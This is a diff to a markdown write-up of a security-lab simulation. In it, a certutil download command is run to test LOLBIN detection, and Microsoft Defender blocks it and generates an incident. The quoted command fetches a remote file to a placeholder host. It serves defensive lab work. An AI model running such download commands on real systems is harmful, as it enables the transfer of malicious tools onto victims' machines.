@@ -124,6 +124,8 @@ This simulation successfully demonstrated the full detection validation process:
 
 This workflow mirrors the real-world process used by SOC analysts when validating and tuning SIEM detection rules.
 
+---
+
 
 ## Simulation 2 — Living-Off-The-Land Binary (LOLBIN) Abuse Detection
 
@@ -142,80 +144,78 @@ The following command was executed in **Command Prompt** to simulate malicious a
 'certutil -urlcache -split -f http://example.com payload.txt'
 
 
-This command attempts to download a file from a remote source and save it locally.
+This command attempts to download a file from a remote location and store it locally.
 
-📷 Screenshot — Command execution:
+In real-world attack scenarios, this technique is often used to download malicious payloads or staging tools.
 
-![Simulation 2 Command Execution](./images/Sim2_commandexecute.png)
+![LOLBIN Command Execution](./images/Sim2_commandexecute.png)
 
 ---
 
 ### Step 2 — Endpoint Protection Detection
 
-When the command was executed, **Microsoft Defender Antivirus immediately detected the activity and blocked the operation** before the Sentinel detection rule could trigger.
+Immediately after executing the command, **Microsoft Defender Antivirus detected the activity and blocked it before the command could complete**.
 
-A Windows Security notification was generated indicating that a potential threat had been identified.
+A Windows Security notification appeared indicating that a potential threat had been detected.
 
-This demonstrates how **endpoint protection can automatically prevent malicious activity before further compromise occurs**.
-
-📷 Screenshot — Defender detection:
-
-![Defender Threat Notification](./images/sim2_DefenderAlert.png)
+This demonstrates how **endpoint protection can automatically prevent malicious behaviour before it progresses further in the attack chain**.
 
 ---
 
 ### Step 3 — Incident Generated in Microsoft Defender
 
-Because the activity was detected and blocked by Defender, an **incident was automatically generated within Microsoft Defender**.
+Because the suspicious command execution was detected by Defender, an **incident was automatically generated within Microsoft Defender**.
 
-The incident aggregates alerts and provides additional context for investigation.
+Incidents aggregate related alerts and provide additional context for investigation by security analysts.
 
-This shows how **endpoint detections are correlated and surfaced within the SOC workflow for investigation**.
-
-📷 Screenshot — Incident page:
+The incident shows that the command execution was **prevented before further impact occurred**.
 
 ![Incident Generated](./images/sim2_Incidentpage.png)
 
 ---
 
-### Step 4 — Incident Investigation (Attack Story)
+### Step 4 — Alert Investigation
 
-Within the incident view, analysts can review the **Attack Story**, which visualizes relationships between:
+Opening the incident allows analysts to review **investigation results and alert evidence**.
 
-- User accounts
-- Devices
-- Processes
-- Alerts
+The investigation confirms:
 
-This helps analysts understand **how the activity originated and which processes were involved**.
+- Detection source: **Microsoft Defender Antivirus**
+- Detection status: **Blocked**
+- The malicious command was prevented from executing successfully.
 
-In this case, the command executed from **Command Prompt** attempted to invoke the `certutil` utility, which Defender identified as suspicious behaviour and blocked.
+This demonstrates how security analysts can review investigation results and confirm that the threat was successfully mitigated.
 
-📷 Screenshot — Incident investigation graph:
+![Investigation Page](./images/Sim2_investigationpage.png)
 
-![Incident Graph](./images/sim2_IncidentGraph.png)
+---
+
+### Step 5 — Alert Details
+
+The alert details provide deeper visibility into the detected activity, including:
+
+- Detection technology used
+- Detection source
+- Detection status
+- Timeline of the event
+
+This information helps analysts validate whether the activity represents malicious behaviour or legitimate testing.
+
+![Alert Details](./images/Sim2_alertdetailspage.png)
 
 ---
 
 ### Key Takeaways
 
-This simulation demonstrates several important SOC detection capabilities:
+This simulation demonstrates several important SOC detection concepts:
 
-- Detection of **LOLBIN abuse techniques**
-- **Microsoft Defender Antivirus automatically blocking malicious activity**
-- **Incident creation and correlation within Microsoft Defender**
-- SOC analysts using the **Attack Story and alert evidence** to investigate activity
+- Attackers frequently abuse **legitimate Windows utilities (LOLBINs)** to perform malicious actions.
+- **Microsoft Defender Antivirus detected and blocked the command automatically**, preventing further execution.
+- Defender generated an **incident that aggregates alerts and investigation context**.
+- Security analysts can review **investigation results and alert evidence** to understand how the activity occurred and confirm remediation.
 
-Even though the Sentinel detection rule was designed to identify LOLBIN abuse, the endpoint protection platform prevented the activity earlier in the detection chain. This is common in real environments where multiple security layers work together to detect and stop threats.
-
----
-
-### MITRE ATT&CK Mapping
-
-| Technique | Description |
-|----------|-------------|
-| T1218 | Signed Binary Proxy Execution |
-| T1105 | Ingress Tool Transfer |
+Although a Sentinel detection rule was configured to detect LOLBIN activity, the **endpoint protection platform prevented the malicious activity earlier in the detection chain**, which is common in real-world environments where multiple security layers work together.
 
 ---
+
 
